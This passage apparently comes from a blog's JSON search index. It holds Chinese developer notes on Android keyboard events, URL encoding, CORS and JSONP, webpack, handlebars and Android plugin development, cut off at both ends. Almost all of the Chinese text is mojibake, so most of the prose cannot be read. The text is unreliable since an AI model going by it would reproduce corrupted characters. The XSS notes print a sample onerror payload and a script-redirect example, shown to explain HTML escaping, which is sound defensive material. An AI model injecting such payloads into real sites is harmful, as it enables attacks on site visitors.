æ¯”è¾ƒå¤æ‚ï¼Œé‡ç‚¹åœ¨äºï¼šä¸€ï¼šæ¢³ç†ä¾èµ–æ ‘(è¿™ä¸ªéš¾ä¸€ç‚¹)ã€‚ äºŒï¼šä»ä¾èµ–æ ‘çš„é¡¶ç«¯å¼€å§‹ç»™æ¯ä¸€ä¸ªchildèµ‹å€¼ä¸Šä¸‹å·¦å³ã€‚ 42. æ‰‹æœºè¾“å…¥æ³•çš„æ˜¾ç¤ºä¸éšè—How to show soft-keyboard when edittext is focusedè¿˜æœ‰å°±æ˜¯å¦‚ä½•ç›‘å¬keyBoardæ‰“å¼€ä¸å…³é—­äº‹ä»¶:çœ‹çœ‹äººå®¶reactNativeæ˜¯æ€ä¹ˆåšçš„ReactRootView.java private void checkForKeyboardEvents() { getRootView().getWindowVisibleDisplayFrame(mVisibleViewArea); final int heightDiff = DisplayMetricsHolder.getWindowDisplayMetrics().heightPixels - mVisibleViewArea.bottom; boolean isKeyboardShowingOrKeyboardHeightChanged = mKeyboardHeight != heightDiff &amp;&amp; heightDiff &gt; mMinKeyboardHeightDetected; if (isKeyboardShowingOrKeyboardHeightChanged) { mKeyboardHeight = heightDiff; sendEvent( &quot;keyboardDidShow&quot;, createKeyboardEventPayload( PixelUtil.toDIPFromPixel(mVisibleViewArea.bottom), PixelUtil.toDIPFromPixel(mVisibleViewArea.left), PixelUtil.toDIPFromPixel(mVisibleViewArea.width()), PixelUtil.toDIPFromPixel(mKeyboardHeight))); return; } boolean isKeyboardHidden = mKeyboardHeight != 0 &amp;&amp; heightDiff &lt;= mMinKeyboardHeightDetected; if (isKeyboardHidden) { mKeyboardHeight = 0; sendEvent( &quot;keyboardDidHide&quot;, createKeyboardEventPayload( PixelUtil.toDIPFromPixel(mVisibleViewArea.height()), 0, PixelUtil.toDIPFromPixel(mVisibleViewArea.width()), 0)); } } ä¹Ÿæ˜¯getWindowVisibleDisplayFrameé‚£ä¸€å¥— mMinKeyboardHeightDetected = (int) PixelUtil.toPixelFromDIP(60); //æ˜¯çš„ï¼Œ60dpçœ‹ä¸Šå»å·®ä¸å¤šäº† 43.androidå¹³å°ä¸Šå±•ç¤ºé˜´å½±çš„æ–¹å¼CardViewå’Œelevationçš„è‡ªå¸¦é˜´å½±å‡ ä¹æ˜¯æ— æ³•å®šåˆ¶çš„shadow4Android å¯ä»¥ç”Ÿæˆåˆé€‚çš„ç‚¹9å›¾ï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½ç”¨ã€‚ 44. ç¾å›¢çš„å…³äºåˆ†æoomä»¥åŠHRPOFæ–‡ä»¶çš„æ–‡ç« é¡ºå¸¦åæ§½äº†åä¸ºæœ€å¤š500æ¡çº¿ç¨‹çš„é—®é¢˜å¯ä»¥ä½œä¸ºåˆ†æå¤„ç†oomæ–‡ä»¶çš„å‚è€ƒ ============================================================================= æœ‰äº›åœ°æ–¹ä¼šå¯¹Apkè¿›è¡ŒäºŒæ¬¡æ‰“åŒ…ï¼ŒåŠ å›ºå°±æ˜¯é˜²ç€è¿™ä¸ªçš„ã€‚ 9. Facebookå‡ºå“çš„BUCKèƒ½å¤Ÿç”¨äºç¼–è¯‘Android é¡¹ç›®ï¼Œé€Ÿåº¦æ¯”è¾ƒå¿«ã€‚ä¸€ä¸ªå…·æœ‰ç½‘ç»œä¼ è¾“çš„FileExplorerMultiDexåŸç†åå‘nativeå±‚é¢çš„å†…å­˜å ç”¨åˆ†æAndroidè¿›ç¨‹æ¡†æ¶ï¼šè¿›ç¨‹çš„å¯åŠ¨åˆ›å»ºã€å¯åŠ¨ä¸è°ƒåº¦æµç¨‹Androidè¿›ç¨‹æ¡†æ¶ï¼šè¿›ç¨‹çš„å¯åŠ¨åˆ›å»ºã€å¯åŠ¨ä¸è°ƒåº¦æµç¨‹Android ä¸­çš„ Hardware Layer è¯¦è§£ | å¼€å‘è€…è¯´Â·DTalk","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"å‰ç«¯é€ŸæŸ¥æ‰‹å†Œ","date":"2017-11-25T23:26:29.000Z","path":"2017/11/25/2017-11-25-front-end-cook-book/","text":"æ¯ä¸€ä¸ªé¢†åŸŸéƒ½æœ‰äº›ä¸çŸ¥é“è¯¥æ”¾å“ªçš„é›¶ç¢çš„ç‚¹ï¼Œè¿™é‡Œå¼€è¾Ÿä¸€ä¸ªæ–°çš„åœ°æ–¹ï¼Œä½œä¸ºå‰ç«¯æ‚ä¹±çŸ¥è¯†çš„æ±‡æ€»ã€‚ SPA(Single Page Application)å•é¡µåº”ç”¨ï¼ˆæ²¡æœ‰SEO,é¦–å±æ—¶é—´æ¯”è¾ƒé•¿ï¼Œå› ä¸ºä¸€è¿›å»è¦æŠŠæ‰€æœ‰çš„jsä¹‹ç±»çš„ä¸œè¥¿éƒ½åŠ è½½å®Œï¼Œä½¿ç”¨è¿‡ç¨‹ä¸­æ¯”è¾ƒæµç•…ï¼‰ Common jsæ˜¯node jsçš„åº“éµå®ˆçš„,export importæ˜¯es2015çš„ä¸œè¥¿,AMD(Asynchronous Module Definition)åœ¨common jsçš„åŸºç¡€ä¸ŠåŠ äº†ä¸€ä¸ªå¸¦å›è°ƒçš„require(ç”¨äºæµè§ˆå™¨) Index html Relatedhtmlæ ‡ç­¾ä¸­å¯ä»¥æ·»åŠ data-XXXæ ‡ç­¾ç”¨äºæŠŠæ•°æ®å’Œuiå—ç»‘å®šã€‚ p tag é‡Œé¢èƒ½å¤Ÿæ”¾ä¸€ä¸ªå°çš„Strong tag &lt;p&gt;You Know &lt;strong&gt;No&lt;/strong&gt; Mystery&lt;/p&gt; äº²æµ‹ï¼Œè¿™äº›tagä¸åˆ†å¤§å°çš„ï¼Œä¸æ˜¯è¯´divå°±ä¸€å®šæ˜¯æœ€å¤–é¢çš„parent &lt;p&gt; new css PlayGround &lt;div&gt;å“ˆå“ˆ&lt;/div&gt; &lt;/p&gt; ä»€ä¹ˆåœ¨é˜»å¡DOMï¼Ÿ Vanilla javaScript RelatedAjax(Asynchronous javaScript &amp; xml)ï¼Œä»å‘½åä¸Šæ¥çœ‹å°±æ˜¯å¼‚æ­¥çš„ json(JavaScript Object notation),æ‘†æ˜ç€å°±æ˜¯ç»™jsç”¨çš„ In JavaScript these two are equivalent: object.Propertyobject[â€œPropertyâ€]; å¯¹äºPOSTè¯·æ±‚ï¼Œå¦‚æœRequestä¸­æ˜ç¡®è®¾ç½®äº†: xhr.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); åå°ä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªæäº¤è¡¨å•çš„è¯·æ±‚ï¼Œbodyå°±åº”è¯¥è®¾ç½®ä¸ºâ€™â€™What is the difference between form data and request payload? ç½‘é¡µè¡¨å•æäº¤æ•°æ®ä¸­åŒ…å«+å·çš„æ—¶å€™ï¼ŒåŠ å·ç›´æ¥å˜æˆç©ºæ ¼javaè¿™è¾¹URLDecoderå»decodeä¸€ä¸ªæœªç¼–ç çš„å¸¦åŠ å·çš„stringçš„æ—¶å€™ï¼Œâ€œ+â€ç›´æ¥å˜æˆäº†ç©ºæ ¼ã€‚è€Œencodeçš„æ—¶å€™ï¼Œç©ºæ ¼è¢«ç¼–ç æˆäº†+å·ï¼Œ+å·å˜æˆäº†%2bã€‚ å¸¸è§„çš„è¡¨å•æäº¤content-typeæœ‰ä¸¤ç§ï¼šapplication/x-www-form-urlencodedå’Œmultipart/form-data,å¦‚æœè¡¨å•æäº¤æ—¶ä¸è®¾ç½®ä»»ä½•ç±»å‹ï¼Œé»˜è®¤ä»¥ç¬¬ä¸€ç§æ–¹å¼æäº¤æ•°æ®ï¼›ç¬¬äºŒç§å±äºå¸¦é™„ä»¶çš„è¡¨å•æäº¤ï¼Œå½“è¡¨å•ä¸­æœ‰é™„ä»¶æ—¶ï¼Œå¿…é¡»è®¾ç½®è¡¨å•çš„enctypeä¸ºmultipart/form-data.ä¾‹å¦‚ JQueryçš„ Ajaxï¼ŒContent-Type é»˜è®¤å€¼ä¸ºapplication/x-www-form-urlencoded;charset=utf-8ã€‚ Content-Type:application/x-www-form-urlencoded; charset=UTF-8è¿™å¥è¯å…¶å®å°±æ˜¯å‘Šè¯‰ajaxï¼Œåœ¨postçš„æ—¶å€™å»æŠŠdataç”¨utf-8ç¼–ç ä¸€éï¼ˆæŠŠâ€œ+â€å˜æˆäº†â€%2bâ€ï¼‰ã€‚æ‰€ä»¥ï¼Œå¦‚æœé»˜è®¤å†™ä¸€ä¸ªç¨‹åºå»postä¸€ä¸ªæœªç»ç¼–ç çš„å¸¦åŠ å·çš„stringçš„è¯ï¼ŒæœåŠ¡å™¨è¿™è¾¹æ¥æ”¶åˆ°çš„stringä¸­,â€+â€å°±å˜æˆäº†ç©ºæ ¼ï¼ˆå› ä¸ºåå°æ˜¯ä¼šç”¨UrlDecoderå»decodeçš„ï¼Œä»æºç æ¥çœ‹ï¼Œç¢°åˆ°äº†â€œ+â€ç›´æ¥æ¢æˆäº†ç©ºæ ¼) urlä¸­å¸¦â€+â€å·çš„é—®é¢˜é™ˆå¹´è€å‘ä¹‹ URL Encoding åœ¨æ­£å¸¸çš„ç¼–ç è§£ç æµç¨‹ä¸­ï¼Œç¼–ç çš„æ—¶å€™å…ˆæŠŠåŠ å·æ›¿æ¢ä¸º %2Bï¼Œç„¶åæŠŠç©ºæ ¼æ›¿æ¢ä¸ºåŠ å·ï¼›è§£ç çš„æ—¶å€™å…ˆæŠŠåŠ å·æ›¿æ¢ä¸ºç©ºæ ¼ï¼Œå†æŠŠ %2B æ›¿æ¢ä¸ºåŠ å·ï¼Œå¤©è¡£æ— ç¼ã€‚å‡å¦‚æˆ‘åœ¨ä¸€ä¸ªç»è¿‡ç¼–ç çš„ URI ä¸­ç›´æ¥æ·»åŠ åŠ å·ï¼Œç„¶åç›´æ¥è¢«æ‹¿å»è§£ç ï¼ŒåŠ å·å°±ä¼šå¦¥å¦¥çš„è¢«æ›¿æ¢æˆç©ºæ ¼äº†ã€‚ æˆ‘å°±ç¢°åˆ°è¿‡é‚£ç§åå°ä¼ ä¸‹æ¥çš„urlä¸­åŒ…å«â€™+â€™ï¼Œç„¶åç”¨URLDecoderå»decodeä¸€éï¼ˆè¿™æ—¶å€™åŠ å·å·²ç»è¢«æ›¿æ¢æˆç©ºæ ¼äº†ï¼‰ï¼Œå†å»ç”¨æ­£åˆ™matchçš„æ—¶å€™ï¼Œå‘ç°æ ¹æœ¬åŒ¹é…ä¸ä¸Šè¿™ä¸ªurl.é‚£ä¹ˆå¦‚ä½•åˆ¤æ–­ä¸€ä¸ªstringæ˜¯å¦è¢«encodeè¿‡ï¼Ÿ ç”±æ­¤æƒ³åˆ°urlä¸­å‡ºç°æ±‰å­—çš„æƒ…å†µï¼Œå› ä¸ºç½‘ç»œä¼ è¾“åªèƒ½æ˜¯0101è¿™ç§ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨utf-8å°†æ±‰å­—çš„unicodeå½¢å¼ä¼ è¾“å‡ºå»ï¼Œåå°å†å»æ ¹æ®å•†å®šå¥½çš„encode formatå»è§£ç ã€‚ï¼ˆæ‰€ä»¥javaçš„URLDecoderçš„decodeæ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯è£¸çš„æ–‡æœ¬,httpæœ¬æ¥å°±æ˜¯text basedï¼Œè¿™æ²¡åŠæ³•ï¼Œç¬¬äºŒä¸ªæ˜¯encodingï¼‰ã€‚åªè¦ä¸¤ç«¯å•†å®šäº†åŒä¸€ç§ç¼–ç æ ¼å¼ï¼Œé‚£å°±èƒ½æ­£å¸¸çš„é€šä¿¡ã€‚ Ajaxä¸­æ–‡ä¹±ç  å‰ç«¯ä¼ å‚å‡ºç°æ±‰å­—çš„æƒ…å†µæœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯æ±‰å­—å‡ºç°åœ¨URLä¸­çš„ä¸€éƒ¨åˆ†ï¼Œå¦ä¸€ç§æ˜¯æ±‰å­—å‡ºç°åœ¨GETè¯·æ±‚çš„queryParametersé‡Œé¢ã€‚å…¶å®æƒ³æƒ³ä¹Ÿå¯¹ï¼Œhttpè¯·æ±‚æ˜¯ä¸€è¡Œä¸€è¡Œå†™textçš„,ç¬¬ä¸€è¡Œæ˜¯pathï¼Œåé¢æ‰æ˜¯queryParameters ajaxå‘é€è¯·æ±‚Webç¼–ç æ€»ç»“å¦‚æœä¸æŒ‡å®šCharSet,ä¼¼ä¹ä¼šçœ‹é¡µé¢ç¼–ç ,å°±æ˜¯è¿™ä¸ª &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; è¿™é‡Œé¢è¿˜æ¶‰åŠåˆ°ä¸€ä¸ªç”¨getå’Œpostè¯·æ±‚é‚£ä¸ªæ¯”è¾ƒåˆé€‚çš„é—®é¢˜ï¼ŒGETè¯·æ±‚æµè§ˆå™¨ä¼šå¸®å¿™encodeï¼Œä½†æ˜¯ï¼Œæœ‰çš„æµè§ˆå™¨(IE)æ˜¯ç”¨ç³»ç»Ÿè‡ªå¸¦ç¼–ç æ ¼å¼ï¼ˆwindowsä¸­æ–‡ç‰ˆæœ¬ä¸Šæ˜¯GB2312)å»encodeçš„ï¼Œå¦‚æœä½¿ç”¨POST,å¼€å‘è€…å¯ä»¥è‡ªå®šä¹‰æ•°æ®ç¼–ç æ ¼å¼ï¼ˆè‡ªå·±è°ƒç”¨encodeURIComponentæŠŠæ‰€æœ‰çš„dataéƒ½utf-8åŠ å¯†ä¸€éï¼‰ è·¨åŸŸæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤§çš„çŸ¥è¯†ç‚¹about:1 Failed to load http://api.douban.com/v2/movie/top250: Response to preflight request doesn&#39;t pass access control check: No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource. Origin &#39;http://localhost:8080&#39; is therefore not allowed access. æŸ¥äº†å¥½ä¹…ï¼ŒåŸå› æ˜¯CORS(Control of Shared Resources)ï¼Œé€šè¿‡ajaxå‘èµ·å¦ä¸€ä¸ªdomain(port)èµ„æºçš„è¯·æ±‚é»˜è®¤æ˜¯ä¸å®‰å…¨çš„ã€‚ä¸»è¦æ˜¯åœ¨jsé‡Œé¢ä»£ç è¯·æ±‚å¦ä¸€ä¸ªç½‘ç«™(åªè¦ä¸æ»¡è¶³hostå’Œportå®Œå…¨ç›¸åŒå°±ä¸æ˜¯åŒä¸€ä¸ªç½‘ç«™)ï¼Œé»˜è®¤æ˜¯è¢«ç¦æ­¢çš„ã€‚chromeé‡Œé¢æŸ¥çœ‹networkçš„è¯ï¼Œå‘ç°è¿™æ¡requestç¡®å®å‘å‡ºå»äº†ï¼Œrequest headeré‡Œé¢å¤šäº†ä¸€ä¸ª Origin:http://localhost:8080æ˜¾ç„¶è¿™ä¸æ˜¯axiosè®¾ç½®çš„ï¼Œåœ¨çœ‹åˆ°è¿™æ¡headeråï¼Œå¦‚æœâ€™/movie/top250â€™è¿™ä¸ªèµ„æºæ–‡ä»¶æ²¡æœ‰è®¾ç½®â€™Access-Control-Allow-Origin: http://localhost:8080&#39;çš„è¯ï¼Œæµè§ˆå™¨å°±ç®—æ‹¿åˆ°äº†æœåŠ¡å™¨çš„å›å¤ä¹Ÿä¸ä¼šå…è®¸è¢«å¼€å‘è€…è·å–ã€‚è¿™æ˜¯CORSåšå‡ºçš„ç­–ç•¥ï¼Œä¹Ÿæ˜¯å‰ç«¯å¼€å‘å¸¸æåˆ°çš„è·¨åŸŸé—®é¢˜ã€‚ è§£å†³æ–¹æ³•ï¼š1.å’ŒæœåŠ¡å™¨å•†é‡å¥½CORS2.ä½¿ç”¨jsonp(è·¨åŸŸè¯·æ±‚å¹¶ä¸é™åˆ¶å¸¦srcå±æ€§çš„tagï¼Œæ¯”å¦‚script imgè¿™äº›)3.ä½¿ç”¨iframeè·¨åŸŸ CORSè¿˜æ˜¯æ¯”è¾ƒé‡è¦çš„ä¸œè¥¿ï¼Œè¯¦è§£ï¼Œæ®è¯´ä¼šå‘ä¸¤æ¬¡è¯·æ±‚,ä¸”åªæ”¯æŒGETè¯·æ±‚ã€‚corsçš„æ¦‚å¿µ search â€œåŸç”ŸjavaScriptè·¨åŸŸâ€ã€â€™jsonpè·¨åŸŸè¯·æ±‚è±†ç“£250â€™ jsonpè·¨åŸŸè·å–è±†ç“£250æ¥å£è±†ç“£èƒ½æ”¯æŒjsonpæ˜¯å› ä¸ºè±†ç“£æœåŠ¡å™¨å“åº”äº† http://api.douban.com/v2/movie/top250?callback=anythingè¿™ä¸ªquery,è¿™ä¸ªanythingæ˜¯æˆ‘ä»¬è‡ªå·±ç½‘é¡µé‡Œé¢scripté‡Œé¢å®šä¹‰çš„æ–¹æ³•ï¼Œè±†ç“£ä¼šè¿”å›ä¸€ä¸ª: anything({json})çš„æ•°æ®å›æ¥ï¼Œç›´æ¥è°ƒç”¨anythingæ–¹æ³• json[JavaScript Object Notation]MDNä¸Šçš„corz å°†ç½‘é¡µè®¾ç½®ä¸ºå…è®¸ XMLHttpRequest è·¨åŸŸè®¿é—® &lt;meta http-equiv=&quot;Access-Control-Allow-Origin&quot; content=&quot;*&quot;&gt; &lt;meta http-equiv=&quot;Access-Control-Allow-Origin&quot; content=&quot;http://www.1688hot.com:80&quot;&gt; è·¨åŸŸçš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œiframeæ˜¯ä¸€ç§ï¼Œiframeæ˜¯åœ¨ä¸€ä¸ªç½‘é¡µä¸­å±•ç¤ºå¦ä¸€ä¸ªurlé¡µé¢èµ„æºçš„æ–¹å¼ &lt;iframe id=&quot;video&quot; width=&quot;420&quot; height=&quot;315&quot; src=&quot;https://www.baidu.com&quot; frameborder=&quot;0&quot; allowfullscreen&gt;&lt;/iframe&gt; ç„¶ååœ¨localhostèµ·ä¸€ä¸ªæœåŠ¡å™¨é¢„è§ˆï¼Œå°±èƒ½åœ¨é¡µé¢ä¸­æ­£å¸¸å±•ç¤ºç™¾åº¦é¦–é¡µã€‚ jsonpçš„è§£é‡Š Flaské‡Œé¢ç»™responseæ·»åŠ Headerçš„æ–¹å¼æ˜¯: response.headers[â€˜Access-Control-Allow-Originâ€™] = â€˜http://localhost:8080&#39; åœ¨8080ç«¯å£çš„webé¡µé¢å‘èµ·è¯·æ±‚å°±èƒ½æˆåŠŸ Webpack ç›¸å…³ å®‰è£…yarn add webpack //å®˜ç½‘ä¸æ¨èglobalå®‰è£…// åˆå§‹åŒ–é¡¹ç›®npm init -y// ä½¿ç”¨webpack app.js bundle.js â€“watch // å°†app.jsç¼–è¯‘æˆbundle.jsï¼Œ å®æ—¶ç›‘æ§æ–‡ä»¶å˜åŒ–ã€‚ Htmlæ–‡ä»¶ä¸­å°±å¯ä»¥å¼•ç”¨bundle.js.buildçš„è¯ï¼Œå°±æ˜¯æŠŠbundle.js minifyçš„è¯ webpack app.js bundle.js -p ,å…¶å®å°±æ˜¯å¸®å¿™æŠŠæ‰€æœ‰çš„ç©ºæ ¼åˆ æ‰äº† a.js let resources = &#39;this is some external resources&#39;; // let èƒ½ç”¨æ˜¯å› ä¸ºnode æ”¯æŒes6è¿™ä¸ªç‰¹æ€§ module.exports = resources; //å¦‚æœä¸æ˜¯ç”¨äºæµè§ˆå™¨çš„é¡¹ç›®çš„è¯ï¼Œnodeæœ¬èº«å°±æ”¯æŒrequireï¼Œåªæ˜¯æµè§ˆå™¨ä¸æ”¯æŒrequire app.js alert(require(&#39;./a.js&#39;)); å¯ä»¥ä¸ºwebpackæä¾›configæ–‡ä»¶webpack.config.js module.exports = { entry: &#39;./src/js/app.js&#39;, // æä¾›äº†ä¸€ä¸ªentry,app.jsåˆå¼•ç”¨äº†å…¶ä»–çš„Jsï¼Œæœ€ç»ˆè¿½æ ¹æº¯æºï¼Œä¼šæŠŠæ‰€æœ‰çš„è‡ªå®šä¹‰å’Œç¬¬ä¸‰æ–¹æ¡†æ¶å…¨éƒ¨æ‰“åˆ°ä¸€ä¸ªbundle.jsé‡Œé¢ outpath: { path: __dirname+&#39;/dist&#39;, filename: &#39;bundle.js&#39; }, module: { loaders: { { test: /\\.css$/, //è¿™ä¸ªtestçš„æ„æ€å°±æ˜¯è¯´è¿™æ˜¯ä¸ªæ­£åˆ™ï¼Œwebpackä½ è‡ªå·±æ‹¿å»è¯•ï¼Œæ­£æ–œæ è¡¨ç¤ºå½“å‰ç›®å½•ä¸‹ï¼Œåæ–œæ è¡¨ç¤ºè½¬ä¹‰å­—ç¬¦ï¼Œå°±æ˜¯åé¢é‚£ä¸ªç‚¹å°±æŠŠå®ƒå½“æˆ&quot;.&quot;å¥½äº† loader: &#39;style-loader!css-loader&#39;} // å‰é¢é‚£ä¸ªæ­£åˆ™æ„æ€æ˜¯é’ˆå¯¹æ‰€æœ‰çš„cssæ–‡ä»¶ï¼Œåé¢æ˜¯éœ€è¦å®‰è£…çš„loaderåç§°ã€‚ è¿™ä¸ªloaderçš„é¡ºåºæ˜¯ä»å³å¾€å·¦çš„ï¼ } } } æœ‰äº†configæ–‡ä»¶ï¼Œåªéœ€è¦è¾“å…¥webpackï¼Œå°±èƒ½è‡ªåŠ¨æ ¹æ®configæ–‡ä»¶ç¼–è¯‘ã€‚åœ¨package.jsonæ–‡ä»¶ä¸­ï¼Œæ·»åŠ script: â€œbuildâ€: â€œwebpackâ€ ï¼Œ npm run build ï¼Œä¼šè‡ªåŠ¨æ ¹æ®configurationæ–‡ä»¶ç¼–è¯‘ç”Ÿæˆå¯ç”¨äºç”Ÿäº§ç¯å¢ƒçš„ç¼–è¯‘åæ–‡ä»¶ã€‚ webpack-dev-server(æä¾›ä¸€ä¸ªdevelopment serverï¼Œå› ä¸ºä¹‹å‰åªæ˜¯èµ°çš„file system) å®‰è£…yarn add webpack-dev-serverpackage.jsonä¸­æ·»åŠ script :start: webpack-dev-server â€“entry ./src/js/app.js â€“out-filename .dist/bundle.jsnpm run start babel-loader(å‰ææ˜¯å®‰è£…äº†babel)å®‰è£…å‚è€ƒå®˜æ–¹æ–‡æ¡£babelå°±æ˜¯æŠŠes6è¯­æ³•çš„jsæ–‡ä»¶ç¼–è¯‘æˆes5æ–‡ä»¶çš„ï¼Œå•ç‹¬ä½¿ç”¨çš„è¯­æ³•å¤§æ¦‚è¿™æ ·ã€‚ webpackçš„loaderæˆç™¾ä¸Šåƒï¼Œbabel-loaderåªæ˜¯å…¶ä¸­çš„ä¸€ç§ npm run babel â€“ index.js -o bundle.js -w å®‰è£…å¥½babel-loaderä¹‹åï¼Œåœ¨webpack.config.jsä¸­æ·»åŠ loader(loadersæœ¬æ¥å°±æ˜¯ä¸€ä¸ªæ•°ç»„) loaders { { test: /\\.js$/, loader: &#39;babel-loader&#39;, exculde: /node_modules/, //æ’é™¤æ‰€æœ‰node_modulesä¸‹é¢çš„æ–‡ä»¶ query: {preset: [&#39;es2015&#39;]}} //è¿™ä¸ªæ­£åˆ™çš„æ„æ€æ˜¯æ‰€æœ‰jsåç¼€çš„æ–‡ä»¶ } Third Party Library Vue Relatedhandlebars,ejs,jadeæ¨¡æ¿ï¼ˆå’Œpythoné‚£è¾¹çš„jinjaæ¨¡æ¿ä¸€ä¸ªæ„æ€ï¼‰ less,sass,stylus(cssé¢„å¤„ç†å™¨)jQuery RelatedjQueryæ˜¯ä¸€ä¸ªDom Manipulate Library Twitter BootStrapBootStrapé€ŸæŸ¥æ‰‹å†Œ css Related å·¥å…·vsCodeæ’ä»¶æ¨è Auto Close tag Beautify HTML CSS supported Live Server Prettier Vetur Vue2 Snippets Bracket Pair Colorizer VSCodeå¿«æ·é”®(å…¶å®å¯ä»¥è‡ªå·±é…ç½®çš„ï¼Œvsçš„è®¾ç½®æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„json)vs code è°ƒæ•´é”è¿›çš„å‘½ä»¤å«åšreindent ç½‘ç«™cssmatic,ä¸€ä¸ªå¯ä»¥ç”¨æ‹–æ‹½çš„æ–¹å¼ç”Ÿæˆcssä»£ç çš„ç¥å¥‡çš„ç½‘ç«™ä¸ä»…ä»…æ˜¯font,è¿˜æœ‰å¾ˆå¥½çš„icon[TBS]è…¾è®¯æµè§ˆæœåŠ¡(Tencent Browsing Service, TBS)ã€‚ç½‘ä¸Šå¾ˆå¤šäººå–·çš„å¾®ä¿¡æµè§ˆå™¨æ…¢å°±æ˜¯è¿™ä¸ªä¸€ä¸ªhtmlé‡Œé¢æœ‰ä¸¤ä¸ªidä¸€æ ·çš„å…ƒç´ æ²¡é—®é¢˜awesome css UI Design,Video link here LibraryBabelæ˜¯ä¸€ä¸ªå¯ä»¥æŠŠES6ä»£ç æ‰“åŒ…æˆES5ä»£ç çš„æ’ä»¶ï¼Œæ¯•ç«Ÿè¦å…¼å®¹è€çš„æµè§ˆå™¨ã€‚ua-parser-jsæ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„æ£€æµ‹uaçš„libraryã€‚Backboneæ˜¯ä¸€ä¸ªmvcæ¡†æ¶handlebars ç§»åŠ¨å¼€å‘ä¸­çš„ä¸€äº›æœ‰ç”¨metaæ ‡ç­¾ [X]å¦‚ä½•ä½¿ç”¨jsæ˜¾ç¤ºä¸€ä¸ªDialog [X]Express js [ ] css3 å±æ€§å¤§å…¨ handlebarsæ¸²æŸ“templateçš„è¿‡ç¨‹å°±æ˜¯æŠŠå†™åœ¨æ¨¡æ¿é‡Œé¢çš„å¤§æ‹¬å·åŒ…ç€çš„å˜é‡æ¢æˆStringã€‚æ‰€ä»¥ï¼Œåœ¨hbsæ–‡ä»¶é‡Œå†…åµŒçš„jsæ˜¯æ²¡æœ‰åŠæ³•è½»æ˜“æ‹¿åˆ°dataçš„ã€‚è¿™è·Ÿflaskå¾ˆåƒã€‚è¿™é‡Œé¡ºä¾¿æåˆ°iffeçš„æ¦‚å¿µImmediately-invoked_function_expression &lt;script src=&quot;http://cdnjs.cloudflare.com/ajax/libs/handlebars.js/1.0.0/handlebars.min.js&quot;&gt;&lt;/script&gt; &lt;script id=&quot;test-template&quot; type=&quot;text/x-handlebars-template&quot;&gt; &lt;label&gt;Label here&lt;/label&gt; {{textField dataAttribs='{\"text\":\"Hello\", \"class\":\"input\"}'}} &lt;/script&gt; Handlebars.registerHelper(&#39;textField&#39;, function(options) { var dom = &#39;&lt;input type=&quot;text&quot;&gt;&#39;, attribs; attribs = JSON.parse(options.hash.dataAttribs); console.log(attribs.text + &quot; -- &quot; + attribs.class); return new Handlebars.SafeString(dom); }); $(function() { var markup = $(&#39;#test-template&#39;).html(); var template = Handlebars.compile(markup); $(&#39;body&#39;).append(template()); }); æ¥çœ‹çœ‹xssä¸€èˆ¬çš„æ‰‹æ®µ &lt;img src=&quot;#&quot; onerror=&quot;alert(/xss/)&quot; /&gt; é˜²èŒƒXSSæ”»å‡»çš„æ‰‹æ®µä¸­æåˆ°äº†ï¼Œå¯¹äºç”¨æˆ·çš„è¾“å…¥ï¼Œéœ€è¦æœ‰æ¡ä»¶çš„è¿›è¡Œè½¬æ¢æ¯”å¦‚è¯´ &lt; å˜æˆ &amp;lt; &gt; å˜æˆ &amp;gt; &amp; å˜æˆ å˜æˆ&amp;quot; å°±åƒè¿™æ · private static String htmlEncode(char c) { switch(c) { case &#39;&amp;&#39;: return &quot;&amp;amp;&quot;; case &#39;&lt;&#39;: return &quot;&amp;lt;&quot;; case &#39;&gt;&#39;: return &quot;&amp;gt;&quot;; case &#39;&quot;&#39;: return &quot;&amp;quot;&quot;; case &#39; &#39;: return &quot;&amp;nbsp;&quot;; default: return c + &quot;&quot;; } } ç»è¿‡ç¼–ç è½¬æ¢ä¹‹å &lt;script&gt;window.location.href=â€http://www.baidu.comâ€;&lt;/script&gt; ## å°±å˜æˆäº† &amp;lt;script&amp;gt;window.location.href=&amp;quot;http://www.baidu.com&amp;quot;&amp;lt;/script&amp;gt; python flaské‡Œé¢ç±»ä¼¼çš„å‡½æ•°å«åšescape. cms(content management system)å‚è€ƒ åœ¨ä¸ä¼šè‡ªå·±æ­æœåŠ¡çš„æƒ…å†µä¸‹åªå¥½æ‹¿ä¸€äº›å…è´¹çš„apiå‡‘åˆäº†postscnodejs å‚è€ƒ ä¸€ä¸ªè…¾è®¯å‰ç«¯çš„åšå®¢ Webpack Crash Course Use Babel &amp; Webpack To Compile ES2015 - ES2017 rel=â€dns-prefetchâ€","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"}]},{"title":"ä»DroidPluginè°ˆæ’ä»¶åŒ–å¼€å‘","date":"2017-11-22T22:33:44.000Z","path":"2017/11/22/2017-11-22-from-Droid-plugin-onto-more/","text":"å…³äº360å›¢é˜Ÿå‡ºå¼€æºçš„DroidPluginçš„ä¸€äº›è®°å½• è¿‡ç¨‹ä¸­å‘ç°äº†å…³äºæ’ä»¶åŒ–ï¼ŒHookç³»ç»Ÿæ–¹æ³•çš„æ“ä½œï¼Œæ‘˜å½•ä¸‹æ¥ã€‚ 1. ä»Contextçš„æœ¬è´¨è¯´èµ·å…¶å®ä¹Ÿç®€å•ï¼Œå°±æ˜¯ContextImplï¼Œä¸€ä¸ªå„ç§èµ„æºçš„å®¹å™¨ã€‚ Activity extends ContextThemeWrapper ContextThemeWrapper extends ContextWrapper ContextWrapper extends Context Activityä½œä¸ºä¸€ä¸ªå¤©ç„¶çš„äº¤äº’æ 